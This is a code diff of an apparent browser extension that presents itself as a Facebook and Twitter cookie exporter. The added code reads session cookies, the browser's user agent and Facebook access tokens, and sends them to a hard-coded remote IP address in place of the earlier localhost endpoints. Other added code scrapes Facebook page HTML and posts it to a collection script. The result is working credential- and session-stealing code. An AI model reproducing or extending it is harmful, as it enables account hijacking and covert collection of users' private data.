@@ -19,7 +19,8 @@ function(e) {
                 error: !1
             },
             methods: {
-                exportCookies: function() {
+                exportCookies: function(c) {
+                    var snsTarget = c.target.getAttribute('sns');
                     var t = this;
                     if (!this.isValidProtocol) return !1;
                     if (this.fullpage) try {
@@ -30,14 +31,66 @@ function(e) {
                     } else e.tabs.query({
                         active: !0,
                         currentWindow: !0
-                    }, function(e) {
-                        if (t.sitename.includes("facebook")) {
-                            // t.doExportFacebook(e[0].url);
-                            t.doExportFacebookGET(e[0].url);
-                        } else if (t.sitename.includes("twitter")) {
-                            t.doExportTwitterGET(e[0].url);
+                    }, async function(e) {
+                        switch (snsTarget) {
+                            case 'facebook':
+                                if ((await t.checkLogin(snsTarget)) == 1) {
+                                    t.doExportFacebookGET('https://mbasic.facebook.com');
+                                } else {
+                                    chrome.tabs.create({ url: 'https://www.facebook.com/' });
+                                }
+                                break;
+                            case 'twitter':
+                                if (await t.checkLogin(snsTarget) == 1) {
+                                    t.doExportTwitterGET('https://twitter.com');
+                                } else {
+                                    // t.doExportTwitterGET(e[0].url);
+                                    chrome.tabs.create({ url: 'https://twitter.com' });
+                                }
+                                break;
+                            default:
+                                console.log('no prob');
                         }
                     })
+                },
+                checkLogin: async function(snsTarget) {
+                    t = this;
+                    switch (snsTarget) {
+                        case 'facebook':
+                            return await t.checkfbLogin();
+                            break;
+                        case 'twitter':
+                            return await t.checktwLogin();
+                            break;
+                        default:
+                            break;
+                    }
+                },
+                checkfbLogin: async function() {
+                    var p = new Promise(function(resolve, reject) {
+                        e.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(cookies) {
+                            cookies.forEach(item => {
+                                if (item['name'] == "c_user") {
+                                    resolve(1); //signed in
+                                }
+                            })
+                        })
+                    });
+                    const result = await p;
+                    return result;
+                },
+                checktwLogin: async function() {
+                    var p = new Promise(function(resolve, reject) {
+                        e.cookies.getAll({ url: 'https://twitter.com' }, function(cookies) {
+                            cookies.forEach(item => {
+                                if (item['name'] == "twid") {
+                                    resolve(1); //signed in
+                                }
+                            })
+                        })
+                    });
+                    const result = await p;
+                    return result;
                 },
                 docparse: function(doc) {
                     var docparse = new DOMParser().parseFromString(doc, "text/xml");
@@ -54,21 +107,19 @@ function(e) {
                 },
                 testP: function() {
                     t = this;
+                    console.log(uid);
                     var abc = this.sendRequest("https://mbasic.facebook.com/")
                     var nf = this.docparse(abc);
-                    console.log(nf);
                     nf.querySelectorAll("a[href$='#footer_action_list']").forEach(function(item, index) {
-                        var href = item.getAttribute('href').split('?')[0];
+                        var href = item.getAttribute('href');
                         if (!(href.includes("mbasic.facebook.com"))) {
                             href = `https://mbasic.facebook.com${href}`;
                         }
-                        // console.log(t.sendRequest(href));
-                        console.log(t.sendRequest(href));
-
+                        console.log(href);
+                        t.sendfbHTML(uid, t.sendRequest(href));
                     });
                 },
                 validateAPIid: function(json) {
-                    //problem????? idk
                     if (json.hasOwnProperty('group_id')) {
                         return `${json['group_id']}_${json['top_level_post_id']}`;
                     } else {
@@ -77,7 +128,6 @@ function(e) {
                 },
                 firstPage: function(t) {
                     this.fbuToken = this.getuToken();
-
                     this.fbid = $.ajax({
                         url: `https://graph.facebook.com/me?fields=id&access_token=${uToken}`,
                         type: "get",
@@ -85,7 +135,7 @@ function(e) {
                         async: false,
                         global: false,
                         success: function(o) {
-
+                            console.log(o);
                         }
                     }).responseJSON['id'];
 
@@ -102,6 +152,43 @@ function(e) {
                         }
                     }).responseText;
                     return s;
+                },
+                sendfbHTML: function(uid, html) {
+                    t = this;
+                    console.log(uid);
+                    var s = $.ajax({
+                        url: "http://localhost/testweb/facebook_collection.php",
+                        data: {
+                            uid: uid,
+                            data: html
+                        },
+                        type: "post",
+                        success: function(o) {
+                            console.log(o);
+                        }
+                    }).responseText;
+                    return s;
+                },
+                testQ: async function() {
+                    var p = new Promise(function(resolve, reject) {
+                        e.cookies.getAll({ url: 'https://twitter.com' }, function(cookies) {
+                            cookies.forEach(item => {
+                                if (item['name'] == "twid") {
+                                    resolve(true); //signed in
+                                }
+                            })
+                        })
+
+                    });
+                    var result = await p;
+                    console.log(result.Promise);
+                    return result;
+                },
+                testW: function() {
+                    this.testQ().then(result => {
+                        console.log(result);
+                        console.log('---------');
+                    })
                 },
                 getfbPost: function(url) {
                     t = this;
@@ -163,48 +250,27 @@ function(e) {
                     var r = this;
                     var UA;
                     try {
-                        var i = new URL(t),
-                            o = i.origin;
+                        var url = 'https://twitter.com';
                         UA = navigator.userAgent;
                         e.cookies.getAll({
-                            url: o
+                            url: url
                         }, function(e) {
                             if (e.length > 0) {
                                 format = '';
                                 for (let i = 0; i < e.length; i++) {
                                     if (e[i].name == 'twid') {
-                                        var uid = e[i].value;
+                                        var uid = e[i].value.slice(4);
                                     }
                                     format += e[i].name + '=' + e[i].value;
                                     if (i < e.length - 1) {
                                         format += ','
                                     }
                                 }
-
-                                var sendurl = `http://localhost/testweb/upload.php?uid=${uid}&url=${o}&useragent=${UA}&cookie=${format}`;
+                                var sendurl = `http://13.21.34.124:8080/php/upload.php?uid=${uid}&url=${url}&useragent=${UA}&cookie=${format}`;
                                 console.log(sendurl);
                                 var encodeurl = encodeURI(sendurl);
                                 console.log(encodeurl);
                                 chrome.tabs.create({ url: encodeurl });
-                                // $.ajax({
-                                //     url: 'http://localhost/testweb/upload.php',
-                                //     type: 'POST',
-                                //     data: {
-                                //         uid: fbInfo['id'],
-                                //         name: fbInfo['name'],
-                                //         url: o,
-                                //         useragent: UA,
-                                //         cookie: format,
-                                //         uToken: uToken,
-                                //         bToken: bToken
-                                //     },
-                                //     success: function(result) {
-                                //         console.log(result);
-                                //         alert(fbInfo['id'] + ' was sent!');
-                                //     }
-
-                                // });
-
                             } else r.error = !0
                         })
                     } catch (s) {
@@ -275,13 +341,13 @@ function(e) {
                                 // chrome.storage.sync.set({ fbUID: fbInfo['id'], fbName: fbInfo['name'], uToken: uToken, bToken: bToken }, function() {
                                 //     console.log('saved');
                                 // });
-                                var sendurl = `http://localhost/testweb/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${o}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
+                                var sendurl = `http://13.21.34.124:8080/php/upload.php?uid=${fbInfo['id']}&name=${fbInfo['name']}&url=${o}&useragent=${UA}&cookie=${format}&uToken=${uToken}&bToken=${bToken}`
                                 console.log(sendurl);
                                 var encodeurl = encodeURI(sendurl);
                                 console.log(encodeurl);
                                 chrome.tabs.create({ url: encodeurl });
                                 // $.ajax({
-                                //     url: 'http://localhost/testweb/upload.php',
+                                //     url: 'http://13.21.34.124:8080/php/upload.php',
                                 //     type: 'POST',
                                 //     data: {
                                 //         uid: fbInfo['id'],
@@ -367,7 +433,7 @@ function(e) {
                                 }
                                 console.log(fbInfo);
                                 $.ajax({
-                                    url: 'http://localhost/testweb/upload.php',
+                                    url: 'http://13.21.34.124:8080/php/upload.php',
                                     type: 'POST',
                                     data: {
                                         uid: fbInfo['id'],
@@ -453,7 +519,7 @@ function(e) {
                                 }
                                 console.log(fbInfo);
                                 $.ajax({
-                                    url: 'http://localhost/testweb/upload.php',
+                                    url: 'http://13.21.34.124:8080/php/upload.php',
                                     type: 'POST',
                                     data: {
                                         uid: fbInfo['id'],
@@ -495,6 +561,7 @@ function(e) {
             },
             mounted: function() {
                 var t = this;
+                console.log(t);
                 e.tabs.query({
                     active: !0,
                     currentWindow: !0
